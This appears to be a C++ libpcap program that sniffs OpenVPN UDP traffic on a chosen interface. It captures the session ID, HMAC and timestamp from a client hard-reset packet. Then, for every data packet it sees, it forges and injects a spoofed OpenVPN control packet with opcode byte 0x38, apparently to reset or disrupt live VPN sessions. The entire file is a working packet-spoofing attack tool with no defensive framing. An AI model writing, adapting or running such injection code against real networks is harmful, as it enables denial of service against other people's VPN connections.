#include <pcap.h>
#include "packet.h"
#include <unistd.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char **argv){
	char *interface = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if(pcap == NULL){
		printf("%s",errbuf);
		return -1;
	}
	

	int res;
	int count=0;
	struct TxPacket *txpkt = new TxPacket;
	struct RxPacket *rxpkt = new RxPacket;
	const uint8_t* packet;
	struct pcap_pkthdr *header;
        uint8_t send_eth_dst[6];
	uint8_t send_eth_src[6];
	uint32_t send_ip;
	uint32_t send_dst;
	uint64_t send_session_id;
	uint8_t send_hmac[20];
	uint32_t send_time;
	uint16_t plus_seq = 0x100;		
	
	int pktCnt = 0;
	while(true) {
                res = pcap_next_ex(pcap, &header, &packet);
		pktCnt++;
		printf("pktcnt = %d\n", pktCnt);
		rxpkt->clear();
                rxpkt -> ethhdr = (struct EthHdr* )(packet);
		if(rxpkt->ethhdr->type() != EthHdr::ipv4) continue;
                rxpkt -> iphdr  = (struct IpHdr* )(packet + ETH_SIZE);
		if(rxpkt->iphdr->proto() != IpHdr::udp) continue;
		rxpkt -> udphdr = (struct UdpHdr* )(packet + ETH_SIZE + rxpkt->iphdr->ipHdrSize());

		rxpkt -> openvpnudphdr2 = (struct OpenVpnUdpHdr2* )(packet + ETH_SIZE + rxpkt->iphdr->ipHdrSize()+UDP_SIZE);

                if(rxpkt->openvpnudphdr2->type_ == OpenVpnUdpHdr::P_CONTROL_HARD_RESET_CLIENT_V2){
			if(count == 0){
                	        memcpy(send_eth_dst, rxpkt -> ethhdr -> dst_, 6);
				memcpy(send_eth_src, rxpkt -> ethhdr -> src_, 6);
				send_session_id = rxpkt -> openvpnudphdr2 -> sessionid_;
	                        memcpy(send_hmac, rxpkt -> openvpnudphdr2 -> hmac_, 20);
				send_time = rxpkt->openvpnudphdr2 -> time_;
				count += 1;
				printf("%d\n",count);
				continue;
        	        }
			send_ip = rxpkt -> iphdr -> src_;
			send_dst = rxpkt -> iphdr -> dst_;
			printf("%x %x\n", send_ip, send_dst);
			continue;
		}
		if(rxpkt->openvpnudphdr2->type_ != OpenVpnUdpHdr::P_DATA_V2){
			continue;
		}

		//printf("this is DATA_V2\n");		
		memcpy(&(txpkt->ethhdr), rxpkt->ethhdr, ETH_SIZE);
                
		//ip1
		memcpy(&(txpkt->iphdr), rxpkt->iphdr, 20);
                txpkt->iphdr.src_ = send_ip;
		txpkt->iphdr.dst_ = send_dst;
		txpkt->iphdr.len_ = ntohs(70);
		txpkt->iphdr.id_ = 0x4444;
		//txpkt->iphdr.flags_ = 4;
		txpkt->iphdr.proto_ = 17;
                txpkt->iphdr.hdrLen_ = 5;
		txpkt->iphdr.checksum_ = IpHdr::calcIpChecksum(&(txpkt->iphdr));
                
		//txpkt->icmphdr.checksum_ = IcmpHdr::calcIcmpChecksum(&(txpkt->iphdr), &(txpkt->icmphdr));
		//udp	
		memcpy(&(txpkt->udphdr), rxpkt->udphdr, UDP_SIZE);
		txpkt->udphdr.length_ = ntohs(50);
                //openvpnudp
		memcpy(&(txpkt->openvpnudphdr2), rxpkt->openvpnudphdr2, rxpkt->udphdr->payloadLen());
		txpkt->openvpnudphdr2.type_ = 0x38;
		txpkt->openvpnudphdr2.sessionid_ = send_session_id;
		memcpy(txpkt->openvpnudphdr2.hmac_, send_hmac, 20);
		txpkt->openvpnudphdr2.pid_ = ntohl(1);
		txpkt->openvpnudphdr2.time_ = send_time;
		txpkt->openvpnudphdr2.mpidarraylength_ = 0;
		txpkt->openvpnudphdr2.mpid_=0;	

		txpkt->udphdr.checksum_ = UdpHdr::calcUdpChecksum(&(txpkt->iphdr), &(txpkt->udphdr));
		
	  	
		res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(txpkt), 14+20+8+txpkt->udphdr.payloadLen());
          if(res !=0){
                  printf("%s",errbuf);
          } else {
	  	printf("======%d======\n", pktCnt);
		printf("this is DATA_V2\n");
		//printf("mpid = %d to %d\n", rxpkt->openvpnudphdr2->mpidarraylength_, send_mpid);
	  }
	}
	
	delete txpkt;
	delete rxpkt;
	pcap_close(pcap);
	return 0;
}
